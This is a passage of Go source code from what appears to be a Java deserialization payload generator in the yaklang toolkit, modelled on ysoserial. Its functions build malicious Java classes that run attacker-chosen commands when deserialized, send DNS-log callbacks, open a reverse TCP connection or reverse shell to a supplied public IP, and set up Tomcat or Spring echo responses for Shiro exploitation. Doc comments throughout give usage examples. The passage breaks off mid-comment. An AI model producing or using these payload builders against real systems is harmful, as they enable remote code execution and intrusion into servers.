package yso

import (
	"github.com/yaklang/yaklang/common/javaclassparser"
	"github.com/yaklang/yaklang/common/log"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/yak/yaklib/codec"
	"strconv"
)

type ClassPayload struct {
	ClassName string
	Help      string
	Generator func(*ClassGenConfig) (*javaclassparser.ClassObject, error)
}

func GenerateClassWithType(typ ClassType, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	return GenerateClass(append(options, SetClassType(typ))...)
}
func GenerateClass(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	config := NewClassConfig(options...)
	if config.ClassType == ClassRaw {
		obj, err := javaclassparser.Parse(config.CustomTemplate)
		if err != nil {
			return nil, utils.Errorf("parse template failed: %v", err)
		}
		if config.ClassName != "" {
			obj.SetClassName(config.ClassName)
		}
		return obj, nil
	}
	name := config.ClassType
	if name == "" {
		return nil, utils.Errorf("class type is empty")
	}
	if YsoConfigInstance != nil && YsoConfigInstance.Classes != nil {
		classTmplCfg, ok := YsoConfigInstance.Classes[name]
		if !ok {
			return nil, utils.Errorf("load class: %s failed: not found template", name)
		}
		obj, err := javaclassparser.Parse(classTmplCfg.Template)
		if err != nil {
			return nil, utils.Errorf("parse template class %s failed: %s", name, err)
		}
		if config.MajorVersion > 0 {
			obj.MajorVersion = config.MajorVersion
		}
		if config.ClassName != "" {
			obj.SetClassName(config.ClassName)
		}
		builder := javaclassparser.NewClassObjectBuilder(obj)
		for _, param := range classTmplCfg.Params {
			val, ok := config.GetParam(param.Name)
			if !ok {
				if param.DefaultValue != "" {
					//log.Warnf("param %s not found in template class `%s`, use default value: %v", param.Name, name, param.DefaultValue)
					val = utils.InterfaceToString(param.DefaultValue)
				} else {
					return nil, utils.Errorf("required param %s for class %s", param.Name, name)
				}
			}
			builder.SetParam(string(param.Name), val)
			if builder.GetErrors() != nil {
				return nil, utils.JoinErrors(builder.GetErrors()...)
			}
		}
		return builder.GetObject(), nil
	} else {
		return nil, utils.Errorf("not found class type: %s", name)
	}
}

const ClassRaw ClassType = "raw"

type ClassGenConfig struct {
	ClassType      ClassType
	MajorVersion   uint16
	ClassName      string
	CustomTemplate []byte
	IsObfuscation  bool
	IsConstruct    bool
	Params         map[ClassParamType]string
}

func (c *ClassGenConfig) SetParam(k ClassParamType, v string) {
	c.Params[k] = v
}
func NewClassConfig(options ...GenClassOptionFun) *ClassGenConfig {
	o := ClassGenConfig{
		ClassName: utils.RandStringBytes(8),
		Params:    map[ClassParamType]string{},
	}
	obj := &o
	for _, option := range options {
		option(obj)
	}
	return obj
}

func SetClassType(t ClassType) GenClassOptionFun {
	return func(config *ClassGenConfig) {
		config.ClassType = t
	}
}
func SetCustomTemplate(customBytes []byte) GenClassOptionFun {
	return func(config *ClassGenConfig) {
		config.CustomTemplate = customBytes
	}
}

// GetParam get param by name
func (cf *ClassGenConfig) GetParam(name ClassParamType) (string, bool) {
	if cf.Params[name] != "" {
		return cf.Params[name], true
	}
	return "", false
}

type GenClassOptionFun func(config *ClassGenConfig)

func SetClassParam(k, v string) GenClassOptionFun {
	return func(config *ClassGenConfig) {
		config.SetParam(ClassParamType(k), v)
	}
}

// SetClassName
// evilClassName 请求参数选项函数，用于设置生成的类名。
// className：要设置的类名。
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.evilClassName("EvilClass"))
// ```
func SetClassName(className string) GenClassOptionFun {
	return func(config *ClassGenConfig) {
		config.ClassName = className
	}
}

// SetConstruct
// useConstructorExecutor 请求参数选项函数，用于设置是否使用构造器执行。
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecEvilClass(command),yso.useConstructorExecutor())
// ```
func SetConstruct() GenClassOptionFun {
	return func(config *ClassGenConfig) {
		config.IsConstruct = true
	}
}

// SetObfuscation
// obfuscationClassConstantPool 请求参数选项函数，用于设置是否混淆类常量池。
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecEvilClass(command),yso.obfuscationClassConstantPool())
// ```
func SetObfuscation() GenClassOptionFun {
	return func(config *ClassGenConfig) {
		config.IsObfuscation = true
	}
}

// SetBytesEvilClass
// useBytesEvilClass 请求参数选项函数，传入自定义的字节码。
// data：自定义的字节码。
// Example:
// ```
// bytesCode,_ =codec.DecodeBase64(bytes)
// gadgetObj,err = yso.GetCommonsBeanutils1JavaObject(yso.useBytesEvilClass(bytesCode))
// ```
func SetBytesEvilClass(data []byte) GenClassOptionFun {
	return SetClassBytes(data)
}

// SetClassBase64Bytes
// useBase64BytesClass 请求参数选项函数，传入base64编码的字节码。
// base64：base64编码的字节码。
// Example:
// ```
// gadgetObj,err = yso.GetCommonsBeanutils1JavaObject(yso.useBase64BytesClass(base64Class))
// ```
func SetClassBase64Bytes(base64 string) GenClassOptionFun {
	bytes, err := codec.DecodeBase64(base64)
	if err != nil {
		log.Error(err)
		return nil
	}
	return SetClassBytes(bytes)
}

// SetClassBytes
// useBytesClass 请求参数选项函数，传入字节码。
// data：字节码。
// Example:
// ```
// bytesCode,_ =codec.DecodeBase64(bytes)
// gadgetObj,err = yso.GetCommonsBeanutils1JavaObject(yso.useBytesClass(bytesCode))
// ```
func SetClassBytes(data []byte) GenClassOptionFun {
	return func(config *ClassGenConfig) {
		config.ClassType = ClassRaw
		config.CustomTemplate = data
	}
}

// LoadClassFromBytes 从字节数组中加载并返回一个javaclassparser.ClassObject对象。
// 这个函数使用GenerateClassObjectFromBytes作为其实现，并允许通过可变参数`options`来配置生成的类对象。
// 这些参数是GenClassOptionFun类型的函数，用于定制类对象的特定属性或行为。
// bytes：要从中加载类对象的字节数组。
// options：用于配置类对象的可变参数函数列表。
// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// bytesCode,_ =codec.DecodeBase64("yv66vg...")
// classObject, _ := yso.LoadClassFromBytes(bytesCode) // 从字节中加载并配置类对象
// ```
func LoadClassFromBytes(bytes []byte, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	return GenerateClassObjectFromBytes(bytes, options...)
}

// LoadClassFromBase64 从base64编码的字符串中加载并返回一个javaclassparser.ClassObject对象。
// 这个函数使用GenerateClassObjectFromBytes作为其实现，并允许通过可变参数`options`来配置生成的类对象。
// 这些参数是GenClassOptionFun类型的函数，用于定制类对象的特定属性或行为。
// base64：要从中加载类对象的base64编码字符串。
// options：用于配置类对象的可变参数函数列表。
// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// classObject, _ := yso.LoadClassFromBytes("yv66vg...") // 从字节中加载并配置类对象
// ```
func LoadClassFromBase64(base64 string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	bytes, err := codec.DecodeBase64(base64)
	if err != nil {
		log.Error(err)
		return nil, err
	}
	return GenerateClassObjectFromBytes(bytes, options...)
}

// LoadClassFromBCEL 将BCEL（Byte Code Engineering Library）格式的Java类数据转换为字节数组，
// 并从这些字节中加载并返回一个javaclassparser.ClassObject对象。
// 这个函数首先使用javaclassparser.Bcel2bytes转换BCEL格式的数据，然后利用GenerateClassObjectFromBytes生成类对象。
// 可通过可变参数`options`来定制类对象的特定属性或行为。
// data：BCEL格式的Java类数据。
// options：用于配置类对象的可变参数函数列表。
// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// bcelData := "$$BECL$$..." // 假设的BCEL数据
// classObject, err := LoadClassFromBCEL(bcelData, option1, option2) // 从BCEL数据加载并配置类对象
// ```
func LoadClassFromBCEL(data string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	bytes, err := javaclassparser.Bcel2bytes(data)
	if err != nil {
		log.Error(err)
		return nil, err
	}
	return GenerateClassObjectFromBytes(bytes, options...)
}

func LoadClassFromJson(jsonData string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	bytes, err := codec.DecodeBase64(jsonData)
	if err != nil {
		log.Error(err)
		return nil, err
	}
	return GenerateClassObjectFromBytes(bytes, options...)
}

// GenerateClassObjectFromBytes 从字节数组中加载并返回一个javaclassparser.ClassObject对象。
// LoadClassFromBytes、LoadClassFromBase64、LoadClassFromBCEL等函数都是基于这个函数实现的。
// 参数是GenClassOptionFun类型的函数，用于定制类对象的特定属性或行为。
// bytes：要从中加载类对象的字节数组。
// options：用于配置类对象的可变参数函数列表。
// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// bytesCode,_ =codec.DecodeBase64("yv66vg...")
// classObject, _ := yso.LoadClassFromBytes(bytesCode) // 从字节中加载并配置类对象
// ```
func GenerateClassObjectFromBytes(bytes []byte, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	return GenerateClassWithType(ClassRaw, append(options, SetCustomTemplate(bytes))...)
}

// SetExecCommand
// command 请求参数选项函数，用于设置要执行的命令。需要配合 useRuntimeExecTemplate 使用。
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.command("whoami"),yso.useRuntimeExecTemplate())
// ```
func SetExecCommand(cmd string) GenClassOptionFun {
	return func(config *ClassGenConfig) {
		config.SetParam(ClassParamCmd, cmd)
	}
}

func SetMajorVersion(v uint16) GenClassOptionFun {
	// 定义Java类文件格式的最小和最大major版本号 1.1 18
	const minMajorVersion uint16 = 45 //
	const maxMajorVersion uint16 = 62 //

	return func(config *ClassGenConfig) {
		if v < minMajorVersion || v > maxMajorVersion {
			v = 52
		}
		config.MajorVersion = v
	}
}

// SetClassRuntimeExecTemplate
// useRuntimeExecTemplate 请求参数选项函数，用于设置生成RuntimeExec类的模板，需要配合 command 使用。
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecTemplate(),yso.command("whoami"))
// ```
func SetClassRuntimeExecTemplate() GenClassOptionFun {
	return func(config *ClassGenConfig) {
		config.ClassType = ClassRuntimeExec
	}
}

// SetRuntimeExecEvilClass
// useRuntimeExecEvilClass 请求参数选项函数，设置生成RuntimeExec类的模板，同时设置要执行的命令。
// cmd：要执行的命令字符串。
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useRuntimeExecEvilClass("whoami"))
// ```
func SetRuntimeExecEvilClass(cmd string) GenClassOptionFun {
	return func(config *ClassGenConfig) {
		config.ClassType = ClassRuntimeExec
		config.SetParam(ClassParamCmd, cmd)
	}
}

// GenerateRuntimeExecEvilClassObject 生成一个使用RuntimeExec类模板的javaclassparser.ClassObject对象，
// 并设置一个指定的命令来执行。这个函数结合使用SetClassRuntimeExecTemplate和SetExecCommand函数，
// 以生成在反序列化时会执行特定命令的Java对象。
// cmd：要在生成的Java对象中执行的命令字符串。
// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command := "ls" // 假设的命令字符串
// classObject, err := yso.GenerateRuntimeExecEvilClassObject(command, additionalOptions...) // 生成并配置RuntimeExec Java对象
// ```
func GenerateRuntimeExecEvilClassObject(cmd string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	return GenerateClassWithType(ClassRuntimeExec, append(options, SetExecCommand(cmd))...)
}

// SetClassProcessBuilderExecTemplate
// useProcessBuilderExecTemplate 请求参数选项函数，用于设置生成ProcessBuilderExec类的模板，需要配合 command 使用。
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useProcessBuilderExecTemplate(),yso.command("whoami"))
// ```
func SetClassProcessBuilderExecTemplate() GenClassOptionFun {
	return func(config *ClassGenConfig) {
		config.ClassType = ClassProcessBuilderExec
	}
}

// SetProcessBuilderExecEvilClass
// useProcessBuilderExecEvilClass 请求参数选项函数，设置生成ProcessBuilderExec类的模板，同时设置要执行的命令。
// cmd：要执行的命令字符串。
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useProcessBuilderExecEvilClass("whoami"))
// ```
func SetProcessBuilderExecEvilClass(cmd string) GenClassOptionFun {
	return func(config *ClassGenConfig) {
		config.ClassType = ClassProcessBuilderExec
		config.SetParam(ClassParamCmd, cmd)
	}
}

// GenerateProcessBuilderExecEvilClassObject 生成一个使用ProcessBuilderExec类模板的javaclassparser.ClassObject对象，
// 并设置一个指定的命令来执行。这个函数结合使用SetClassProcessBuilderExecTemplate和SetExecCommand函数，
// 以生成在反序列化时会执行特定命令的Java对象。
// cmd：要在生成的Java对象中执行的命令字符串。
// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command := "ls" // 假设的命令字符串
// classObject, err := yso.GenerateProcessBuilderExecEvilClassObject(command, additionalOptions...) // 生成并配置ProcessBuilderExec Java对象
// ```
func GenerateProcessBuilderExecEvilClassObject(cmd string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	return GenerateClassWithType(ClassProcessBuilderExec, append(options, SetExecCommand(cmd))...)
}

// SetClassProcessImplExecTemplate
// useProcessImplExecTemplate 请求参数选项函数，用于设置生成ProcessImplExec类的模板，需要配合command使用。
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useProcessImplExecTemplate(),yso.command("whoami"))
// ```
func SetClassProcessImplExecTemplate() GenClassOptionFun {
	return func(config *ClassGenConfig) {
		config.ClassType = ClassProcessImplExec
	}
}

// SetProcessImplExecEvilClass
// useProcessImplExecEvilClass 请求参数选项函数，设置生成ProcessImplExec类的模板，同时设置要执行的命令。
// cmd：要执行的命令字符串。
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useProcessImplExecEvilClass("whoami"))
// ```
func SetProcessImplExecEvilClass(cmd string) GenClassOptionFun {
	return func(config *ClassGenConfig) {
		config.ClassType = ClassProcessImplExec
		config.SetParam(ClassParamCmd, cmd)
	}
}

// GenerateProcessImplExecEvilClassObject 生成一个使用ProcessImplExec类模板的javaclassparser.ClassObject对象，
// 并设置一个指定的命令来执行。这个函数结合使用SetClassProcessImplExecTemplate和SetExecCommand函数，
// 以生成在反序列化时会执行特定命令的Java对象。
// cmd：要在生成的Java对象中执行的命令字符串。
// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// command := "ls" // 假设的命令字符串
// classObject, err := yso.GenerateProcessImplExecEvilClassObject(command, additionalOptions...) // 生成并配置ProcessImplExec Java对象
// ```
func GenerateProcessImplExecEvilClassObject(cmd string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	return GenerateClassWithType(ClassProcessImplExec, append(options, SetExecCommand(cmd))...)
}

// SetClassDnslogTemplate
// useDnslogTemplate 请求参数选项函数，用于设置生成Dnslog类的模板，需要配合 dnslogDomain 使用。
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useDnslogTemplate(),yso.dnslogDomain("dnslog.com"))
// ```
func SetClassDnslogTemplate() GenClassOptionFun {
	return func(config *ClassGenConfig) {
		config.ClassType = ClassDNSLog
	}
}

// SetDnslog
// dnslogDomain 请求参数选项函数，设置指定的 Dnslog 域名，需要配合 useDnslogTemplate 使用。
// addr：要设置的 Dnslog 域名。
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useDnslogTemplate(),yso.dnslogDomain("dnslog.com"))
// ```
func SetDnslog(addr string) GenClassOptionFun {
	return func(config *ClassGenConfig) {
		config.SetParam(ClassParamDomain, addr)
	}
}

// SetDnslogEvilClass
// useDnslogEvilClass 请求参数选项函数，设置生成Dnslog类的模板，同时设置指定的 Dnslog 域名。
// addr：要设置的 Dnslog 域名。
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useDnslogEvilClass("dnslog.com"))
// ```
func SetDnslogEvilClass(addr string) GenClassOptionFun {
	return func(config *ClassGenConfig) {
		config.ClassType = ClassDNSLog
		config.SetParam(ClassParamDomain, addr)
	}
}

// GenDnslogClassObject
// GenerateDnslogEvilClassObject 生成一个使用Dnslog类模板的javaclassparser.ClassObject对象，
// 并设置一个指定的 Dnslog 域名。这个函数结合使用 useDNSlogTemplate 和 dnslogDomain 函数，
// 以生成在反序列化时会向指定的 Dnslog 域名发送请求的Java对象。
// domain：要在生成的Java对象中请求的 Dnslog 域名。
// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// domain := "dnslog.com" // 假设的 Dnslog 域名
// classObject, err := yso.GenerateDnslogEvilClassObject(domain, additionalOptions...) // 生成并配置Dnslog Java对象
// ```
func GenDnslogClassObject(domain string, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	return GenerateClassWithType(ClassDNSLog, append(options, SetDnslog(domain))...)
}

// SetClassSpringEchoTemplate
// useSpringEchoTemplate 请求参数选项函数，用于设置生成SpringEcho类的模板，需要配合 springHeader 或 springParam 使用。
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springHeader("Echo","Echo Check"))
// ```
func SetClassSpringEchoTemplate() GenClassOptionFun {
	return func(config *ClassGenConfig) {
		config.ClassType = ClassSpringEcho
	}
}

// SetHeader
// springHeader 请求参数选项函数，设置指定的 header 键值对，需要配合 useSpringEchoTemplate 使用。
// 需要注意的是，发送此函数时生成的 Payload 时，需要设置header：Accept-Language: zh-CN,zh;q=1.9，以触发回显。
// key：要设置的 header 键。
// val：要设置的 header 值。
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springHeader("Echo","Echo Check"))
// ```
func SetHeader(key string, val string) GenClassOptionFun {
	return func(config *ClassGenConfig) {
		config.SetParam(ClassParamHeader, key)
		config.SetParam(ClassParamCmd, val)
	}
}

// SetParam
// springParam 请求参数选项函数，设置指定的回显值，需要配合 useSpringEchoTemplate 使用。
// param：要设置的请求参数。
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springParam("Echo Check"))
// ```
func SetParam(val string) GenClassOptionFun {
	return func(config *ClassGenConfig) {
		config.SetParam(ClassParamCmd, val)
	}
}

// SetExecAction
// springRuntimeExecAction 请求参数选项函数，设置是否要执行命令。
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springRuntimeExecAction(),yso.springParam("Echo Check"),yso.springEchoBody())
// ```
func SetExecAction() GenClassOptionFun {
	return func(config *ClassGenConfig) {
		config.SetParam(ClassParamAction, "exec")
	}
}

// SetEchoBody
// springEchoBody 请求参数选项函数，设置是否要在body中回显。
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useSpringEchoTemplate(),yso.springRuntimeExecAction(),yso.springParam("Echo Check"),yso.springEchoBody())
// ```
func SetEchoBody() GenClassOptionFun {
	return func(config *ClassGenConfig) {
		config.SetParam(ClassParamPosition, "body")
	}
}

// GenerateSpringEchoEvilClassObject 生成一个使用SpringEcho类模板的javaclassparser.ClassObject对象，
// 这个函数结合使用 useSpringEchoTemplate 和 springParam 函数， 以生成在反序列化时会回显指定内容的Java对象。
// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// classObject, err := yso.GenerateSpringEchoEvilClassObject(yso.springHeader("Echo","Echo Check")) // 生成并配置SpringEcho Java对象
// ```
func GenerateSpringEchoEvilClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	return GenerateClassWithType(ClassSpringEcho, options...)
}

// SetClassModifyTomcatMaxHeaderSizeTemplate
// useModifyTomcatMaxHeaderSizeTemplate 请求参数选项函数，用于设置生成ModifyTomcatMaxHeaderSize类的模板。
// 一般用于shiro利用，用于修改 tomcat 的 MaxHeaderSize 值。
// Example:
// ```
// yso.GetCommonsBeanutils1JavaObject(yso.useTomcatEchoEvilClass(),yso.useModifyTomcatMaxHeaderSizeTemplate())
// ```
func SetClassModifyTomcatMaxHeaderSizeTemplate() GenClassOptionFun {
	return func(config *ClassGenConfig) {
		config.ClassType = ClassModifyTomcatMaxHeaderSize
	}
}

// GenerateModifyTomcatMaxHeaderSizeEvilClassObject 生成一个使用ModifyTomcatMaxHeaderSize类模板的javaclassparser.ClassObject对象，
// 这个函数结合使用 useModifyTomcatMaxHeaderSizeTemplate 函数， 以生成在反序列化时会修改 tomcat 的 MaxHeaderSize 值的Java对象。
// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// classObject, err := yso.GenerateModifyTomcatMaxHeaderSizeEvilClassObject() // 生成并配置ModifyTomcatMaxHeaderSize Java对象
// ```
func GenerateModifyTomcatMaxHeaderSizeEvilClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	return GenerateClassWithType(ClassModifyTomcatMaxHeaderSize, options...)
}

// GenEmptyClassInTemplateClassObject 生成一个使用EmptyClassInTemplate类模板的javaclassparser.ClassObject对象，
// 空类生成（用于template）
// ```
func GenEmptyClassInTemplateClassObject(options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	return GenerateClassWithType(ClassEmptyClassInTemplate, options...)
}

// SetClassTcpReverseTemplate
// useTcpReverseTemplate 请求参数选项函数，用于设置生成TcpReverse类的模板，需要配合 tcpReverseHost 和 tcpReversePort 使用。
// 还需要配合 tcpReverseToken 使用，用于是否反连成功的标志。
// Example:
// ```
// host = "公网IP"
// token = uuid()
// yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(),yso.tcpReverseHost(host),yso.tcpReversePort(8080),yso.tcpReverseToken(token))
// ```
func SetClassTcpReverseTemplate() GenClassOptionFun {
	return func(config *ClassGenConfig) {
		config.ClassType = ClassTcpReverse
	}
}

// SetTcpReverseHost
// tcpReverseHost 请求参数选项函数，设置指定的 tcpReverseHost 域名，需要配合 useTcpReverseTemplate ，tcpReversePort 使用。
// 还需要配合 tcpReverseToken 使用，用于是否反连成功的标志。
// host：要设置的 tcpReverseHost 的host。
// Example:
// ```
// host = "公网IP"
// token = uuid()
// yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(),yso.tcpReverseHost(host),yso.tcpReversePort(8080),yso.tcpReverseToken(token))
// ```
func SetTcpReverseHost(host string) GenClassOptionFun {
	return func(config *ClassGenConfig) {
		config.SetParam(ClassParamHost, host)
	}
}

// SetTcpReversePort
// tcpReversePort 请求参数选项函数，设置指定的 tcpReversePort 域名，需要配合 useTcpReverseTemplate ，tcpReverseHost 使用。
// 还需要配合 tcpReverseToken 使用，用于是否反连成功的标志。
// port：要设置的 tcpReversePort 的port。
// Example:
// ```
// host = "公网IP"
// token = uuid()
// yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(),yso.tcpReverseHost(host),yso.tcpReversePort(8080),yso.tcpReverseToken(token))
// ```
func SetTcpReversePort(port int) GenClassOptionFun {
	return func(config *ClassGenConfig) {
		config.SetParam(ClassParamPort, strconv.Itoa(port))
	}
}

// SetTcpReverseToken
// tcpReverseToken 请求参数选项函数，设置指定的 token 用于是否反连成功的标志，需要配合 useTcpReverseTemplate ，tcpReverseHost ，tcpReversePort 使用。
// token：要设置的 token 。
// Example:
// ```
// host = "公网IP"
// token = uuid()
// yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseTemplate(),yso.tcpReverseHost(host),yso.tcpReversePort(8080),yso.tcpReverseToken(token))
// ```
func SetTcpReverseToken(token string) GenClassOptionFun {
	return func(config *ClassGenConfig) {
		config.SetParam(ClassParamToken, token)
	}
}

// SetTcpReverseEvilClass
// useTcpReverseEvilClass 请求参数选项函数，设置生成TcpReverse类的模板，同时设置指定的 tcpReverseHost ，tcpReversePort。
// 相当于 useTcpReverseTemplate ，tcpReverseHost  两个个函数的组合。
// host：要设置的 tcpReverseHost 的host。
// port：要设置的 tcpReversePort 的port。
// Example:
// ```
// host = "公网IP"
// token = uuid()
// yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseEvilClass(host,8080),yso.tcpReverseToken(token))
// ```
func SetTcpReverseEvilClass(host string, port int) GenClassOptionFun {
	return func(config *ClassGenConfig) {
		config.ClassType = ClassTcpReverse
		config.SetParam(ClassParamHost, host)
		config.SetParam(ClassParamPort, strconv.Itoa(port))
	}
}

// GenTcpReverseClassObject
// GenerateTcpReverseEvilClassObject 生成一个使用TcpReverse类模板的javaclassparser.ClassObject对象，
// 这个函数结合使用 useTcpReverseTemplate ，tcpReverseHost ，tcpReversePort 函数， 以生成在反序列化时会反连指定的 tcpReverseHost ，tcpReversePort 的Java对象。
// host：要设置的 tcpReverseHost 的host。
// port：要设置的 tcpReversePort 的port。
// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// host = "公网IP"
// token = uuid()
// classObject, err := yso.GenerateTcpReverseEvilClassObject(host,8080,yso.tcpReverseToken(token),additionalOptions...) // 生成并配置TcpReverse Java对象
// ```
func GenTcpReverseClassObject(host string, port int, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	return GenerateClassWithType(ClassTcpReverse, append(options, SetTcpReverseHost(host), SetTcpReversePort(port))...)
}

// SetClassTcpReverseShellTemplate
// useTcpReverseShellTemplate 请求参数选项函数，用于设置生成TcpReverseShell类的模板，需要配合 tcpReverseShellHost 和 tcpReverseShellPort 使用。
// 该参数与 useTcpReverseTemplate 的区别是，该参数生成的类会在反连成功后，执行一个反弹shell。
// Example:
// ```
// host = "公网IP"
// yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseShellTemplate(),yso.tcpReverseShellHost(host),yso.tcpReverseShellPort(8080))
// ```
func SetClassTcpReverseShellTemplate() GenClassOptionFun {
	return func(config *ClassGenConfig) {
		config.ClassType = ClassTcpReverseShell
	}
}

// SetTcpReverseShellEvilClass
// useTcpReverseShellEvilClass 请求参数选项函数，设置生成TcpReverseShell类的模板，同时设置指定的 tcpReverseShellHost ，tcpReverseShellPort。
// 相当于 useTcpReverseShellTemplate ，tcpReverseShellHost，tcpReverseShellPort  三个个函数的组合。
// host：要设置的 tcpReverseShellHost 的host。
// port：要设置的 tcpReverseShellPort 的port。
// Example:
// ```
// host = "公网IP"
// yso.GetCommonsBeanutils1JavaObject(yso.useTcpReverseShellEvilClass(host,8080))
// ```
func SetTcpReverseShellEvilClass(host string, port int) GenClassOptionFun {
	return func(config *ClassGenConfig) {
		config.ClassType = ClassTcpReverseShell
		config.SetParam(ClassParamHost, host)
		config.SetParam(ClassParamPort, strconv.Itoa(port))
	}
}

// GenTcpReverseShellClassObject
// GenerateTcpReverseShellEvilClassObject 生成一个使用TcpReverseShell类模板的javaclassparser.ClassObject对象，
// 这个函数结合使用 useTcpReverseShellTemplate ，tcpReverseShellHost ，tcpReverseShellPort 函数， 以生成在反序列化时会反连指定的 tcpReverseShellHost ，tcpReverseShellPort 的Java对象。
// host：要设置的 tcpReverseShellHost 的host。
// port：要设置的 tcpReverseShellPort 的port。
// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// host = "公网IP"
// classObject, err := yso.GenerateTcpReverseShellEvilClassObject(host,8080,additionalOptions...) // 生成并配置TcpReverseShell Java对象
// ```
func GenTcpReverseShellClassObject(host string, port int, options ...GenClassOptionFun) (*javaclassparser.ClassObject, error) {
	return GenerateClassWithType(ClassTcpReverseShell, append(options, SetTcpReverseHost(host), SetTcpReversePort(port))...)
}

// SetClassTomcatEchoTemplate
// useTomcatEchoTemplate 请求参数选项函数，用于设置生成TomcatEcho类的模板，需要配合 useHeaderParam 或 useEchoBody、useParam 使用。
// Example:
// ```
// body 回显
// bodyClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useTomcatEchoTemplate(),yso.useEchoBody(),yso.useParam("Body Echo Check"))
// header 回显
// headerClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useTomcatEchoTemplate(),yso.useHeaderParam("Echo","Header Echo Check"))
// ```
func SetClassTomcatEchoTemplate() GenClassOptionFun {
	return func(config *ClassGenConfig) {
		config.ClassType = ClassTomcatEcho
	}
}

// SetTomcatEchoEvilClass
// useTomcatEchoEvilClass 请求参数选项函数，设置 TomcatEcho 类，需要配合 useHeaderParam 或 useEchoBody、useParam 使用。
// 和 useTomcatEchoTemplate 的功能一样
// Example:
// ```
// body 回显
// bodyClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useTomcatEchoEvilClass(),yso.useEchoBody(),yso.useParam("Body Echo Check"))
// header 回显
// headerClassObj,_ = yso.GetCommonsBeanutils1JavaObject(yso.useTomcatEchoEvilClass(),yso.useHeaderParam("Echo","Header Echo Check"))
// ```
func SetTomcatEchoEvilClass() GenClassOptionFun {
	return func(config *ClassGenConfig) {
		config.ClassType = ClassTomcatEcho
	}
}

// GenTomcatEchoClassObject
// GenerateTomcatEchoEvilClassObject 生成一个使用TomcatEcho类模板的javaclassparser.ClassObject对象，
// options：一组可选的GenClassOptionFun函数，用于进一步定制生成的Java对象。
// 返回：成功时返回javaclassparser.ClassObject对象及nil错误，失败时返回nil及相应错误。
// Example:
// ```
// body 回显
// bodyClassObj,_ = yso.GenerateTomcatEchoEvilClassObject(yso.useEchoBody(),yso.useParam("Body Echo Check"))
// header 回显
